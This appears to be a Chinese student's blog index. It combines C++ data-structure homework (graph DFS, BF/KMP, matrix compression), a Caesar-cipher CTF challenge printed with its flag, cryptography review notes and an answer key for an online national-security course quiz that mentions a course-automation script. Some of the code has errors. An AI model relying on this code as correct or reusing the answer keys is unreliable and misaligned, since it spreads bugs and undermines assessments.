adjlist[MaxSize];\t//存放顶点表\tint vertexNum, edgeNum;\t\t\t\t\t//图的顶点数和边数&#125;;template&lt;class DataType&gt;ALGraph&lt;DataType&gt;::ALGraph(DataType a[], int n, int e)&#123;\tint i, j, k;\tEdgeNode* s = nullptr;\tvertexNum = m;\tedgeNum = e;\tfor (int i = 0; i &lt; vertexNum; i++)\t&#123;\t\tadjlist[i].vertex = a[i];\t\tadjlist[i].firstEdge = NULL;\t&#125;\tfor (k = 0; k &lt; edgeNum; k++)\t//依次输入每一条边\t&#123;\t\tcout &lt;&lt; &quot;输入边所依付的两个顶点的编号：&quot;;\t\tcin &gt;&gt; i &gt;&gt; j;\t\ts = new EdgeNode;\t\ts-&gt;adjvex = j;\t\ts-&gt;next = adjlist[i].firstEdge;\t\tadjlist[i].firstEdge = s;\t&#125;&#125;template&lt;class DataType&gt;ALGraph&lt;DataType&gt;::~ALGraph()&#123;\tEdgeNode* p = NULL, * q = NULL;\tfor (int i = 0; i &lt; vertexNum; i++)\t&#123;\t\tp = q = adjlist[i].firstEdge;\t\twhile (p != NULL)\t\t&#123;\t\t\tp = p-&gt;next;\t\t\tdelete q;\t\t\tq = p;\t\t&#125;\t&#125;&#125;template&lt;class DataType&gt;void ALGraph&lt;DataType&gt;::DFTraverse(int v)&#123;\tint j;\tEdgeNode* p = null;\tcout &lt;&lt; adjlist[v].vertex;\tvisited[v] = 1;\tp = adjlist[v].firstEdge;\twhile (p != NULL)\t&#123;\t\tj = p-&gt;adjvex;\t\tif (visited[j]==0)\t\t&#123;\t\t\tDFTraverse(j);\t\t&#125;\t\tp = p-&gt;next;\t&#125;&#125;int main()&#123;\t//测试数据是图6-20(a)，边是(0 1)(0 3)(0 4)(1 2)(2 4)(3 2)(3 4)\tstring ch[] = &#123; &#x27;V1&#x27;,&#x27;V2&#x27;,&#x27;V3&#x27;,&#x27;V4&#x27;,&#x27;V5&#x27; &#125;;\tint i;\tALGraph&lt;char&gt; ALG(ch, 5, 7);               //建立具有5个顶点6条边的有向图\tfor (i = 0; i &lt; MaxSize; i++)\t\tvisited[i] = 0;\tcout &lt;&lt; &quot;深度优先遍历序列是：&quot;;\tALG.DFTraverse(0);                       //从顶点0出发进行深度优先遍历\tfor (i = 0; i &lt; MaxSize; i++)\t\tvisited[i] = 0;\tcout &lt;&lt; &quot;广度优先遍历序列是：&quot;;\tALG.BFTraverse(0);                      //从顶点0出发进行广度优先遍历\treturn 0;&#125;\n\n","categories":["学习笔记","数据结构作业","实验"],"tags":["数据结构作业"]},{"title":"实验四：字符串和多维数组的实现与应用","url":"/posts/6352a281.html","content":"\nBF+KMP算法#include &lt;iostream&gt;#include &lt;string.h&gt;#define MaxSize 1000#define MaxLen 1000using namespace std;struct SeqString&#123;\tchar ch[MaxSize];\tint len;&#125;;// BF算法int BF(char S[], char T[])&#123;\tint i = 0, j = 0, start = 0;\twhile (S[i] != &#x27;\\0&#x27; &amp;&amp; T[j] != &#x27;\\0&#x27;)\t&#123;\t\tif (S[i] == T[j])\t\t&#123;\t\t\ti++;\t\t\tj++;\t\t&#125;\t\telse\t\t&#123;\t\t\tstart++;\t\t\ti = start;\t\t\tj = 0;\t\t&#125;\t&#125;\tif (T[j] == &#x27;\\0&#x27;)\t&#123;\t\treturn start + 1;\t&#125;\telse\t&#123;\t\treturn 0;\t&#125;&#125;void GetNext(SeqString t, int next[])&#123;\tint j, k;\tj = 0;\tk = -1;\tnext[0] = -1;\twhile (j &lt; t.len - 1)\t&#123;\t\tif (k == -1 || t.ch[j] == t.ch[k])\t\t&#123;\t\t\tj++;\t\t\tk++;\t\t\tnext[j] = k;\t\t&#125;\t\telse\t\t\tk = next[k];\t&#125;&#125;int KMP(SeqString s, SeqString t)&#123;\tint next[MaxLen], i = 0, j = 0;\tGetNext(t, next); // 求next值\twhile (i &lt; s.len &amp;&amp; j &lt; t.len) // 修改这里\t&#123;\t\tif (j == -1 || s.ch[i] == t.ch[j])\t\t&#123;\t\t\ti++;\t\t\tj++;\t\t&#125;\t\telse\t\t&#123;\t\t\tj = next[j];\t\t&#125;\t&#125;\tif (j &gt;= t.len)\t&#123;\t\treturn (i - t.len); // 返回下标\t&#125;\telse\t&#123;\t\treturn 0; // 不匹配\t&#125;&#125;int main()&#123;\tcout &lt;&lt; &quot;*******BF算法实验*******&quot; &lt;&lt; endl;\tchar a[MaxLen], b[MaxLen];\tcout &lt;&lt; &quot;请输入主串&quot; &lt;&lt; endl;\tcin &gt;&gt; a;\tcout &lt;&lt; &quot;输入了&quot; &lt;&lt; a &lt;&lt; endl;\tcout &lt;&lt; &quot;请输入子串&quot; &lt;&lt; endl;\tcin &gt;&gt; b;\tcout &lt;&lt; &quot;输入了&quot; &lt;&lt; b &lt;&lt; endl;\tint bf = BF(a, b);\tif (bf == 0)\t&#123;\t\tcout &lt;&lt; &quot;BF算法结果：未找到&quot; &lt;&lt; endl;\t&#125;\telse\t&#123;\t\tcout &lt;&lt; &quot;BF算法结果：位置是：&quot; &lt;&lt; bf &lt;&lt; endl;\t&#125;\tcout &lt;&lt; &quot;*******BF算法实验*******&quot; &lt;&lt; endl;\tcout &lt;&lt; endl;\tcout &lt;&lt; endl;\tcout &lt;&lt; endl;\tcout &lt;&lt; &quot;*******KMP算法实验*******&quot; &lt;&lt; endl;\tSeqString s, t;\tcout &lt;&lt; &quot;请输入主串&quot; &lt;&lt; endl;\tcin &gt;&gt; s.ch;\ts.len = strlen(s.ch);\tcout &lt;&lt; &quot;输入了&quot; &lt;&lt; s.ch &lt;&lt; endl;\tcout &lt;&lt; &quot;长度是：&quot; &lt;&lt; s.len &lt;&lt; endl;\tcout &lt;&lt; &quot;请输入子串&quot; &lt;&lt; endl;\tcin &gt;&gt; t.ch;\tt.len = strlen(t.ch);\tcout &lt;&lt; &quot;输入了&quot; &lt;&lt; t.ch &lt;&lt; endl;\tcout &lt;&lt; &quot;长度是：&quot; &lt;&lt; t.len &lt;&lt; endl;\tint kmp = KMP(s, t);\tif (kmp == 0)\t&#123;\t\tcout &lt;&lt; &quot;KMP算法结果：未找到&quot; &lt;&lt; endl;\t&#125;\telse\t&#123;\t\tcout &lt;&lt; &quot;KMP算法结果：位置是：&quot; &lt;&lt; kmp + 1 &lt;&lt; endl; // 返回的下标从1开始计数，所以需要+1\t&#125;\tcout &lt;&lt; &quot;*******KMP算法实验*******&quot; &lt;&lt; endl;\treturn 0; // 确保main函数有返回值&#125;\n\n\n\n对称矩阵的压缩#include &lt;iostream&gt;#define MaxSize 1000using namespace std;struct yuansu&#123;\tint i;\tint j;\tint data;&#125;;class Matrix&#123;public:\tMatrix();\tvoid PrintMatrix();\tvoid getMatrix(yuansu s);\t~Matrix();private:\tint ma[MaxSize];&#125;;Matrix::Matrix()&#123;\tfor (int i = 0; i &lt; MaxSize; i++)\t\tma[i] = 0;&#125;Matrix::~Matrix()&#123;&#125;void Matrix::getMatrix(yuansu s)&#123;\tif (s.i &gt;= s.j) &#123;\t\tint k = s.i * (s.i - 1) / 2 + s.j - 1;\t\tma[k] = s.data;\t&#125;&#125;void Matrix::PrintMatrix()&#123;\tfor (int i = 0; i &lt; MaxSize; i++)\t\tif (ma[i] != 0)\t\t\tcout &lt;&lt; &quot;ma[&quot; &lt;&lt; i &lt;&lt; &quot;] = &quot; &lt;&lt; ma[i] &lt;&lt; endl;&#125;int main()&#123;\tMatrix ws;\tyuansu s;\tcin &gt;&gt; s.i &gt;&gt; s.j &gt;&gt; s.data;\tws.getMatrix(s);\tws.PrintMatrix();\tcin &gt;&gt; s.i &gt;&gt; s.j &gt;&gt; s.data;\tws.getMatrix(s);\tws.PrintMatrix();\tcin &gt;&gt; s.i &gt;&gt; s.j &gt;&gt; s.data;\tws.getMatrix(s);\tws.PrintMatrix();\treturn 0;&#125;\n\n","categories":["学习笔记","数据结构作业","实验"],"tags":["数据结构作业"]},{"title":"密码学——凯撒密码原理","url":"/posts/dcad2738.html","content":"凯撒密码\n来自千千秀字\n\n凯撒密码最早由古罗马军事统帅盖乌斯·尤利乌斯·凯撒在军队中用来传递加密信息，故称凯撒密码。这是一种位移加密方式，只对26个字母进行位移替换加密，规则简单，容易破解。下面是位移1次的对比：\n\n\n\n明文字母表\nZ\nA\nB\nC\nD\nE\nF\nG\nH\nI\nJ\nK\nL\nM\nN\nO\nP\nQ\nR\nS\nT\nU\nV\nW\nX\nY\n\n\n\n密文字母表\nA\nB\nC\nD\nE\nF\nG\nH\nI\nJ\nK\nL\nM\nN\nO\nP\nQ\nR\nS\nT\nU\nV\nW\nX\nY\nZ\n\n\n将明文字母表向后移动1位，A变成了B，B变成了C……，Z变成了A。同理，若将明文字母表向后移动3位：\n\n\n\n明文字母表\nX\nY\nZ\nA\nB\nC\nD\nE\nF\nG\nH\nI\nJ\nK\nL\nM\nN\nO\nP\nQ\nR\nS\nT\nU\nV\nW\n\n\n\n密文字母表\nA\nB\nC\nD\nE\nF\nG\nH\nI\nJ\nK\nL\nM\nN\nO\nP\nQ\nR\nS\nT\nU\nV\nW\nX\nY\nZ\n\n\n则A变成了D，B变成了E……，Z变成了C。\n字母表最多可以移动25位。凯撒密码的明文字母表向后或向前移动都是可以的，通常表述为向后移动，如果要向前移动1位，则等同于向后移动25位，位移选择为25即可。\n尝试一下现在你已经知道原理了，解密一下下面这个吧\noknqdbqmoq&#123;kag_tmhq_xqmdzqp_omqemd_qzodkbfuaz&#125;\n\n.\n.\n在线解密地址凯撒密码在线加密解密 - 千千秀字 (qqxiuzi.cn)\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\n.\ncyberpeace{you_have_learned_caesar_encryption}\n","categories":["CTF","Crypto"],"tags":["CTF"]},{"title":"密码学引论复习","url":"/posts/a5daf678.html","content":"密码体制分类 P7密码体制从原理上可分为两大类，单钥体制和双钥体制。\n\n单钥体制：加密和解密使用同一个密钥。系统的安全性依赖于对密钥的保密，与算法的保密性无关。\n双钥体制：加密和解密使用不同的密钥。主要特点是加密和解密能力分开，可以实现多个用户加密的消息，只有拥有解密能力的用户才能解密，或一个用户加密的消息而使多用户可以解读。\n\n密码攻击概述 P7\n\n\n攻击类型\n攻击者掌握的内容\n\n\n\n唯密文攻击\n- 加密算法- 截获的部分密文\n\n\n已知明文攻击\n- 加密算法- 截获的部分密文- 一个或多个明文密文对\n\n\n选择明文攻击\n- 加密算法- 截获的部分密文- 自己选择的明文消息，及有密钥产生的相应密文\n\n\n选择密文攻击\n- 加密算法- 截获的部分密文- 自己选择的密文消息，及相应的被解密的明文\n\n\n几种古典密码 P8单表代换密码 P9\n凯撒密码\n移位密码\n仿射密码\n\n比较简单\n多表代换密码 P10行乘以列，相加，可以先 mod 再求和\n解密就是逆矩阵，再进行上面操作\n流密码的基本概念 P13流密码的基本思想是：利用秘钥 $$ k $$，产生一个密钥流 $$ z = z_0 z_1 z_2 \\ldots $$，并使用如下规则对明文串 $$ x = x_0 x_1 x_2 \\ldots $$ 加密：$$ y = y_0 y_1 y_2 \\ldots = E_&#123;z_0&#125;(x_0) E_&#123;z_1&#125;(x_1) E_&#123;z_2&#125;(x_2) \\ldots $$有记忆元件\n流密码的基本概念 P13有限状态自动机 P14线性反馈移位寄存器 P16\nn 级线性反馈移位寄存器最多有 $$ 2^n $$ 个状态。\nn 级线性反馈移位寄存器的状态周期小于等于 $$ 2^n - 1 $$\n输出序列的周期也小于等于 $$ 2^n - 1 $$\n只要选择合适的反馈函数，就可以使输出序列的周期达到最大值 $$ 2^n - 1 $$，周期达到最大值的序列称为 m 序列。\n\n分组密码概述 P32扩散和混淆 P34Feistel 密码结构 P35数据加密标准 P38DES 描述 P38二重 DESP43两个秘钥的三重 DESP44三个秘钥的三重 DESP44分组密码的运行模式 P47电子码本模式 P47密码分组链接模式 P48密码反馈模式 P49输出反馈模式 P51AES 算法——Rijndael P58Rijndael 的数学基础和设计思想 P58算法说明 P61密码学中一些常用的数学知识 P83费马定理、欧拉定理、卡米歇尔定理 P89欧几里得算法 P95公钥密码体制的基本概念 P109RSA 算法 P113（简单带过）椭圆曲线密码体制 P124（了解就行）第四章习题 P133密钥分配与密钥管理 P135密钥的分层控制 P137公钥加密体制的密钥管理 P143Diffie-Hellman 密钥交换 P143消息认证和哈希函数 P156消息认证码的定义及使用方式 P157哈希函数的定义及使用方式 P161哈希函数应满足的条件 P162迭代型哈希函数的一般结构 P163数字签名和认证协议 P182数字签名的基本概念 P182数字签名标准 P186DSS 的基本方式 P186数字签名算法 DSA P187第七章习题 P201","categories":["密码学"],"tags":["密码学","复习"]},{"title":"常用在线计算工具","url":"/posts/4b4dd526.html","content":"概率论与数理统计排列组合在线计算器 (23bei.com)\n","categories":["学习笔记","在线计算工具"],"tags":["计算工具"]},{"title":"当代大学生国家安全教育___2023章节测试答案超星尔雅","url":"/posts/6430770.html","content":"\n来源：微信公众平台\n顺序有少许不对，建议使用浏览器自带的搜索功能进行快速定位\n为爱发电！\n\n注意！！！！！\n博主已经找到刷课脚本，理论上讲本页面答案已经被淘汰，请移步详细阅读刷课脚本安装使用教程，永远坚持无私奉献！\n注意！！！！！\n1【单选题】《七律二首·送瘟神》中“借问瘟君欲何往，纸船明烛照天烧。”这里的“瘟君”指的是（）。\nA、鼠疫\nB、甲肝\nC、肺结核\nD、血吸虫病\n我的答案：D\n2【单选题】《时局图》的配诗“沉沉酣睡我中华，哪知爱国即爱家。国民知醒宜今醒，莫待土分裂似瓜。”该诗作者是中国同盟会会员（）。\nA、刘复基\nB、谢缵泰\nC、陆皓东\nD、彭楚藩\n我的答案：B\n3【多选题】维护国家安全，是坚持和发展中国特色社会主义，实现“两个一百年”奋斗目标和中华民族伟大复兴中国梦的重要保障。国家安全十分重要，国家安全（）。\nA、直接关乎国家主权独立和领土完整\nB、是人民安居乐业、幸福生活的保障\nC、是社会稳定、长治久安的基石\nD、是实现中华民族伟大复兴中国梦的重要前提\n我的答案：ABCD\n1.2\n1【单选题】2013年11月召开的党的十八届三中全会决定，成立（），完善国家安全体制和国家安全战略，确保国家安全。\nA、国家安全部\nB、国家安全领导小组\nC、国家安全统筹平台\nD、中央国家安全委员会\n我的答案：D\n2【单选题】我国是一个发展中的社会主义大国，所处的内外环境、历史发展阶段和未来国家发展战略目标，决定了国家安全必须走（）的道路。答案：\nA、专门工作\nB、群众工作\nC、中国特色\nD、西方特色\n我的答案：C\n2.1\n1【单选题】（）是国家安全的根本。\nA、政治安全\nB、军事安全\nC、文化安全\nD、社会安全\n我的答案：A\n2【判断题】党的十八大以来，党中央高度重视政治安全，强调坚持总体国家安全观要以政治安全为根本，突出了政治安全的特殊地位。\n我的答案：√\n3【判断题】政治安全影响着军事安全、经济安全、社会安全、文化安全等各个领域的安全，国家安全的其他要素最终也要反映到维护政治安全上来。\n我的答案：√\n4【判断题】在2011年公布的《中国的和平发展》白皮书中，我国首次明确界定了六项国家核心利益：国家主权、国家安全、领土完整、国家统一、中国宪法确立的国家政治制度和社会大局稳定、经济社会可持续发展的基本保障。\n我的答案：√\n2.2\n1【单选题】（）是国家政治安全的最高层次，是国家政治安全根本。\nA、主权安全\nB、政权安全\nC、制度安全\nD、意识形态安全\n我的答案：B\n2【单选题】（）说“美国制衡制度结出了政治僵局的恶果。”\nA、福山\nB、林肯\n我的答案：A\n3【单选题】（）是国家独立自主地处理对内对外事务的最高权力，是国家独立的根本标志。\nA、制度安全\nB、政权安全\nC、主权安全\nD、意识形态安全\n我的答案：C\n4【多选题】意识形态是党的一项极端重要的工作，必须旗帜鲜明地批驳意识形态的错误思潮，坚定（）。\nA、道路自信\nB、制度自信\nC、理论自信\nD、文化自信\n我的答案：ABCD\n5【判断题】对我国而言，军事安全最为核心的内容是党执政地位的巩固和国家政治秩序的稳定。\n我的答案：X\n6【判断题】意识形态安全是国家政治安全的有机组成部分，是实现国家政治安全重要的思想武器。\n我的答案：√\n2.3\n1【多选题】当前，政治安全面临的威胁、挑战主要表现在（）方面。ABCD\nA、精神懈息、能力不足、脱离群众，消极腐败的危险\nB、颜色革命”对我国政治安全构成重大现实威胁\nC、我国意识形态领域斗争形势复杂严峻\nD、“一国两制”在香港的实践也遇到了新情况、新问题\n2【判断题】西方敌对势力对我国实施“西化”“分化”“遏制”的图谋与活动将长期存在，政治安全领域风险错综复杂。\n我的答案：√\n2.4\n1【单选题】“小事不出村，大事不出镇，矛盾不上交”出自（）。\nA、镇江经验\nB、嘉兴经验\nC、枫桥经验\nD、盐城经验\n我的答案：C\n2【多选题】维护政治安全是一项长期复杂的系统工程，应主要采取下列哪些举措（）。\nA、全面从严治党，加强党和政府同人民群众的血肉联系\nB、坚决防范“颜色革命”，坚决抵制境外势力渗透，坚定社会主义制度自信，加强民主政治和法治建设，加强国家安全防控体系建设\nC、做好意识形态工作\nD、依法保障“一国两制”实施\n我的答案：ABCD\n3【判断题】《中华人民共和国香港特别行政区维护国家安全法》颁布实施，迈出了建立健全香港特别行政区维护国家安全的法律制度和执行机制的关键一步。\n我的答案：√\n3.1\n1【多选题】国土安全涵盖（）等要素，是指领土完整、国家统一、海洋权益及边疆边境不受侵犯或威胁的状态。\nA、领土\nB、自然资源\nC、基础设施\nD、人口\n我的答案：ABC\n2【判断题】国土安全是立国之基，是传统安全备受关注的首要方面。\n我的答案：√\n3.2\n1【多选题】国土是国家主权赖以存在的物质空间，包括（）三部分，上至高空，下及底土。\nA、领陆\nB、领水（包括内水和领海）\nC、领空\nD、外太空\n我的答案：ABC\n2【多选题】我国与（）尚未划定陆地边界，领土安全问题尚未完全解决。\nA、俄罗斯\nB、印度\nC、蒙古\nD、不丹\n我的答案：BD\n3【判断题】1992年2月25日全国人大通过的《领海及毗连区法》规定，中华人民共和国领海的宽度从领海基线量起为10海里。\n我的答案：X\n3.3\n1【多选题】长期以来，我坚持与邻为善、以邻为伴，体现（）理念。\nA、亲\nB、诚\nC、惠\nD、容\n我的答案：ABCD\n2【多选题】我国反分裂斗争形势依然错综复杂，比较突出的问题有（）。\nA、疆独\nB、藏独\nC、台独\nD、港独\n我的答案：ABCD\n3【判断题】我国是海陆兼备的国家，陆地边界与16个国家接壤，海上与8个国家相邻。\n我的答案：X\n3.4\n1【多选题】（）是新时期维护国土安全工作提供了新的法律武器。\nA、《反分裂国家法》\nB、《国家安全法》\nC、《反恐怖主义法》\nD、《国防法》\n我的答案：ABCD\n2【判断题】党的十九大作出“坚持陆海统筹，加快建设海洋强国”的部署以来，陆海统筹在体制机制建设、产业、资源、环境和区域协同发展等领域取得重要进展。\n我的答案：√\n4.1\n1【判断题】在传统国家安全观中，军事安全是整个国家安全体系的核心内容，处于首要位置、支柱地位。\n我的答案：√\n2【判断题】1999年3月24日至6月11日，以美国为首的北约军队，未经联合国安理会授权，对南联盟进行了长达78天的空袭。\n我的答案：√\n4.2\n1【单选题】当今世界战争形态加速向信息化战争演变，（）主导成为制胜关键。\nA、非接触性\nB、精确性\nC、体系\nD、信息\n我的答案：D\n2【判断题】《中国的军事战略》白皮书指出：中国发展仍将处于可以大有作为的重要战略机遇期，外部环境总体有利，但仍然面临多元复杂的安全威胁，遇到的外部阻力和挑战逐步增多。\n我的答案：√\n4.3\n1【多选题】适应武器装备更新换代和作战样式发展变化，要牢牢把握（）的原则。\nA、军委管总\nB、战区主战\nC、军种主建\nD、联合训练\n我的答案：ABC\n2【多选题】我国坚持发展（）的第三方对外军事关系，推动建立公平有效的集体安全机制和军事互信机制。\nA、不联合\nB、不结盟\nC、不对抗\nD、不针对\n我的答案：BCD\n3【判断题】进行军事斗争准备，要把基点放在打赢信息化局部战争上，突出海上军事斗争。\n我的答案：√\n5.1\n1【判断题】经济安全的作用主要体现在保障国防工业、军事装备的生产与供给，重要战略经济资源的供给方面。（）\n我的答案：√\n2【判断题】经济实力影响和制约着国家的国防、科技、教育等实力，所以说，经济安全事关国家的国际地位。（）\n我的答案：√\n5.2\n1【多选题】以（）的基本经济制度，是中国特色社会主义制度的重要支柱，也是社会主义市场经济体制的根基。只有保持公有制经济的主体地位，才能保证社会主义方向。\nA、公有制为主体\nB、多种所有制经济共同发展\nC、私有制为主体\nD、公有制为补充\n我的答案：AB\n2【多选题】我国根据本国的国情，采取以（）的分配制度，实质上反映出劳动、管理、资本、技术、土地等各种生产要素，都按贡献参与了收益分配。\nA、按需分配为主体\nB、按劳分配为补充\nC、按劳分配为主体\nD、多种分配方式并存\n我的答案：CD\n3【多选题】流通是社会再生产过程中（）中的一个独立的经济活动。流通环节在经济发展中占有非常重要的地位，哪一个环节出现了问题，经济都无法健康发展。\nA、生产\nB、分配\nC、交换（流通）\nD、消费\n我的答案：ABCD\n4【多选题】经济主权安全是指国家独立自主处理经济事务的安全，主要包括（）。\nA、独立自主处理经济事务的权力有保障\nB、掌握和使用资源的权力\nC、独立自主参与国际经济活动的安全\nD、独立进行经济建设\n我的答案：ABC\n5【多选题】经济发展安全主要包括（）。\nA、经济发展道路安全\nB、经济发展所需人才和物资的安全\nC、经济外部环境安全\nD、经济文化环境安全\n我的答案：AB\n5.3\n1【多选题】新形势下，（）抬头，经济全球化遭遇波折，多边主义和自由贸易体制受到冲击，不稳定不确定因素依然很多，风险挑战加剧，这对我国的经济安全带来了深层挑战。\nA保护主义\nB单边主义\nC保守主义\nD多边主义\n我的答案：AB\n2【多选题】经济安全面临的国际威胁与挑战有（）。\nA金融安全存在风险\nB财政安全存在风险\nC产业安全存在风险\nD粮食安全风险将逐步上升\nE经济发展存在滑坡风险\n我的答案：ABCDE\n3【判断题】全球化背景下，中国经济在国内和国际两个场域下齐头并进，这使得中国经济发展取得了较好的成绩，但是，我国经济面临的国内、国际环境仍很严峻，发展还面临着较大压力。\n我的答案：√\n5.4\n1【多选题】维护经济安全，主要应从维护（）和统筹国内发展与国际合作竞争的关系方面进行。\nA、基本经济制度安全\nB、构建良好的经济秩序\nC、维护经济主权安全\nD、实现经济安全发展\n我的答案：ABCD\n2【多选题】要坚决依法打击（ ）等违法犯罪行为，震慑犯罪分子，提高犯罪成本和难度，降低经济领域的违法犯罪率，确保经济健康有序发展。\nA、降低发展速度\nB、破坏经济秩序\nC、危害企业发展\nD、损害市场诚信\n我的答案：BCD\n3【多选题】维护经济主权安全，主要要做到（）。\nA、坚持新发展理念，促进高质量发展\nB、强化经济主权意识\nC、增强我国综合国力\nD、创新和完善宏观调控\n我的答案：BC\n6.1\n1【单选题】（）国家安全委员会在其2000年发布的国家利益报告中，把国家利益分为“致命利益、极端重要利益、重要利益、次要利益”四个等级。\nA、中国\nB、美国\nC、日本\nD、英国\n我的答案：B\n2【判断题】全球化时代，文化软实力的作用被人们深刻认识，富国强兵的“兵”从以往的军事武力转化为当今的文化实力。\n我的答案：√\n6.2\n1【单选题】早在20世纪70年代末，美国的卡特政府就提出（）的文化战略，苏联和东欧阵营的解体在很大程度上是西方这一文化战略的结果。\nA、石油外交\nB、军事外交\nC、人权外交\nD、结盟外交\n我的答案：C\n2【判断题】文化主权是国家主权在文化领域里的延伸，是国家主权不可分割的重要组成部分。\n我的答案：√\n6.3\n1【判断题】境外资本、文化企业、文化产品和服务大量进入国内，对我国维护文化安全带来很大压力。\n我的答案：√\n2【判断题】境内外各种势力利用互联网散布有害信息、传播错误思想，一些不法分子在网上传播散播低俗信息，网上思想文化争夺日益加剧。\n我的答案：√\n6.4\n1【判断题】提高国家文化软实力， 关系我国在世界文化格局中的定位，关系我国国际地位和国际影响力，关系“两个一百年”奋斗目标和中华民族伟大复兴中国梦的实现。\n我的答案：√\n2【判断题】中华民族优秀的传统文化包括爱国主义、爱好和平、勤劳勇敢、自强不息等，这是中华民族最有利的文化软实力。\n我的答案：√\n7.1\n1【判断题】维护国家安全，离不开社会的和谐稳定和长治久安。改革开放以来，我们党始终高度重视社会安全，始终把维护社会安定作为一项基础性工作。\n我的答案：√\n2【判断题】十九届四中全会报告的第九部分中，将国家安全与社会治理、社会稳定合并在一起阐述，充分说明了社会安全与国家安全的密切相关性。\n我的答案：√\n7.2\n1【多选题】社会安全，是指社会处于一种和谐有序和健康发展的状态，以及持续维护社会安全的能力。一般而言，社会安全的主要内容包括（BCD）等相关内容。\nA、社会治理\nB、社会治安\nC、社会安全事件\nD、社会舆情\n2【多选题】我国社会治安面临着部分地区（ABCD）等“困境”。因此，必须坚定政治立场、持续深入扫黑除恶斗争。\nA、扫黑除恶\nB、涉众型经济犯罪\nC、网络生态空间风险、诈骗案件防治\nD、食品安全、涉税犯罪\n3【多选题】社会安全事件，主要包括（ABC），以及暴力恐怖主义活动和社会群体性事件等重大安全事件，直接对人民群众生命财产安全造成威胁，严重影响我国社会安全。\nA、重大自然灾害\nB、重大事故\nC、重大公共卫生灾害事件\nD、重大舆情\n7.3\n1【多选题】新形势下我国社会安全面临的威胁和挑战增多，特别是各种威胁和挑战联动效应明显。具体包括（ABCD）。\nA、暴力恐怖活动多发，严重影响社会安全\nB、社会治安问题突出，影响公众安全感\nC、社会矛盾积聚，加大社会安全风险\nD、网络公共安全问题凸显，给社会安全带来挑战\n2【多选题】我国仍处于刑事犯罪的高发期，违法犯罪活动日趋（ABD），严重暴力犯罪，案件突出，高新技术犯罪、网络犯罪增多，对传统公共安全工作提出挑战。\nA、暴力化\nB、组织化\nC、年青化\nD、职业化\n3【判断题】改革开放以来，我国社会加速转型，积聚了诸如生产责任事故高发、劳资冲突不断、社会道德失范、信任危机加深之类的社会风险因素，出现了不同社会发展阶段，风险因素交织叠加的特征。\n我的答案：√\n4【判断题】全力打击暴力恐怖犯罪、坚决依法惩处暴恐分子，为人民群众建立安定有序、繁荣和谐的社会环境，既是民心所昐，也是众望所归。\n我的答案：√\n7.4\n1【多选题】维护社会安全，稳步提升人民群众的安全感和满意度，要切实做到（ABCD）。\nA、切实维护公共安全\nB、深入开展反恐怖斗争\nC、有效预防和妥善处置群体性事件\nD、切实维护网络社会安全\n2【判断题】\n传统违法犯罪加速向网上发展蔓延，电信诈骗、窃取公民个人信息等新型网络犯罪活动不断滋生。\n我的答案：√\n8.1\n1【单选题】（B）是指科技体系完整有效，国家重点领域核心技术安全可控，国家核心利益和安全不受外部科技优势危害，以及保障持续安全状态的能力。\nA、技术安全\nB、科技安全\nC、科学安全\nD、科研安全\n2【单选题】（C）凭借其科技优势，不会侧重于防范国外科技优势的威胁，更多的是如何通过科技手段威胁敌对国家。\nA、发展中国家\nB、落后国家\nC、发达国家\nD、第三世界国家\n8.2\n1【多选题】科技安全的主要内容包括（ABCD）。\nA、科技人才安全\nB、科技设施设备安全\nC、科技活动安全\nD、国防科技安全\n2【判断题】科技人才是智力资源，是科技安全最重要的保障。\n我的答案：√\n8.3\n1【判断题】在新技术不断出现和交叉融合态势下，如果不抓住机遇，加快突破，不仅我国现有产业转型升级目标无法实现，而且未来我国重点产业命脉更难以掌握在自己手里。\n我的答案：√\n2【判断题】\n虽然我国科技安全的面貌有了极大改善，但是科技创新基础还不牢固，自主创新特别是原始创新能力还不强，关键领域核心技术受制于人的局面没有得到根本改善。\n我的答案：√\n8.4\n1【单选题】（B）明确规定：国家加强自主创新能力建设，加快发展自主可控的战略高新技术和重要领域核心关键技术，加强知识产权的运用、保护和科技保密能力，保障重大技术和工程的安全。\nA、《知识产权法》\nB、《国家安全法》\nC、《宪法》\nD、《网络安全法》\n2【判断题】面对科技安全领域的这些风险挑战，关键是要牢牢坚持创新驱动发展战略，努力推动我国科技实力和产业实力实现全面提升。\n我的答案：√\n9.1\n1【单选题】从（C）的角度来说，他们希望对网络信息的访问、读写等操作受到保护和控制。\nA、安全保密部门\nB、用户\nC、网络运行和管理者\nD、公众\n2【单选题】（A）是指一个国家在建设、运营、维护和使用网络，以及在网络安全的监督管理方面所拥有的自主决定权。\nA、网络空间主权\nB、网络监督权\nC、网络自主权\nD、网络管理权\n9.2\n1【判断题】网络安全包括网络基础设施、网络运行与服务、信息安全等方面，是保障和促进信息社会健康发展的基础。\n我的答案：√\n2【判断题】《网络安全审查办法》首次在我国法律层面明确关键信息基础设施的概念，并对关键信息基础设施安全防护提出专门要求。\n我的答案：X\n9.3\n1【单选题】（B）已经成为继陆地、海洋、天空、外太空之外的第五空间。\nA、河流\nB、网络空间\nC、冰川\nD、地壳\n2【判断题】网络上各种思想文化相互激荡、交锋，优秀传统文化和主流价值观面临冲击。\n我的答案：√\n9.4\n1【判断题】关键核心技术是国之重器，对推动我国经济高质量发展、保障国家安全都具有十分重要的意义。\n我的答案：√\n2【判断题】《网络安全法》由国家互联网信息办公室、国家发改委等12个部门联合发布，2020年6月1日起正式生效。\n我的答案：X\n10.1\n1【单选题】生态安全是指一个国家具有支撑国家生存发展的较为完整不受威胁的（B），以及应对内外重大生态问题的能力。\nA、生存环境\nB、生态系统\nC、生态条件\nD、生态指